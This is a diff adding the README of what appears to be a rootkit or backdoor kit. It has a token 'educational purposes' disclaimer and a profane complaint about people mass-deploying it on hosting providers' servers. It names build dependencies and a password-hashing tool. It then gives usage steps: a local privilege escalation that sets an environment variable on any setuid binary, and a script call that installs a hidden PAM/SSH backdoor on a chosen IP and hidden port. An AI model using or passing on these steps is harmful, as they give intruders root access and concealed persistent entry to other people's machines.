@@ -1,0 +1,32 @@
+DISCLAIMER
+THIS CODE IS FOR EDUCATIONAL/EXPERIMENTAL PURPOSES ONLY
+ANY MISUSE OR ABUSE OF THIS CODE IS NOT THE RESPONSIBILITY OF THE AUTHOR
+
+This is experimental code.
+Do not rely on it for strong anonymity.
+Do not rely on it for strong invisibility.
+
+Also don't mass-deploy it or pop it on cPanel Inc's update boxes like last time
+AND DON'T FUCKING PUT IT ON ALL OF SINGLEHOP AGAIN.
+Like, seriously, who does that with somebody else's malware?
+Don't do that. That gets it detected.
+This is why we can't have nice things.
+This is why stuff like this commit happens.
+https://github.com/cPanelSSP/SSP/commit/6099bd5d4b6d3cf63a11bb1b434987e6fe7d37f3
+
+The GUI installer's pretty straightforward.
+
+Dependencies: OpenSSL binaries, libs, headers (or a smart user)
+Password hashing format is Whirlpool. There's a tool included in utils.
+The installer actually uses this, but your mileage may vary compiling it
+on strange systems. If you run into issues just edit the installer script a bit.
+Bring a static-compiled pwgen and unfuck if you're desperate to get it working
+
+To get root from local:
+
+YOUR_ENV_VAR=1 [any suid bin]
+
+New PAM backdoor: bash utils/ssh-hidden.sh ip user hideport
+Simple enough, right?
+If you still need help then fuck you.
+
